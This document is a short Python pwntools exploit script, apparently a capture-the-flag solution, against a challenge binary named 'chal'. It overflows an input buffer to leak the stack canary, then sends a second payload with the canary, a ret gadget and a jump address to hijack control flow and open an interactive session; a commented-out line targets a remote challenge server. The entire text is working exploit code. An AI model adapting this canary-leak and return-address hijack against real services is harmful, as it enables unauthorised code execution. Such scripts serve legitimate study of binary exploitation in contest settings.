#!/usr/bin/env python

from pwn import ELF, ROP, context, log, p64, process, remote

context.log_level = "debug"
context.terminal = ["tmux", "split-window", "-h"]

elf = ELF("./chal")

p = process(elf.path)
# p = remote("34.70.212.151", 8005)

r = ROP(elf)

ret = r.find_gadget(["ret"])[0]
escape = elf.symbols["escape"]

# gdb.attach(
#     p,
#     """
#     set follow-fork-mode child
#     break 0x00401564
#     continue
#     """,
# )

payload = b"A" * 32
payload += b"B" * 40

p.sendlineafter(b"Enter key : ", payload)
p.recvline()
canary = b"\x00" + p.recvline().strip()[:7]
log.info(f"canary: {canary}")
payload = payload + canary + p64(ret) + p64(0x00401596)

p.sendlineafter(b"Enter key : ", payload)
# p.recv()
p.interactive()
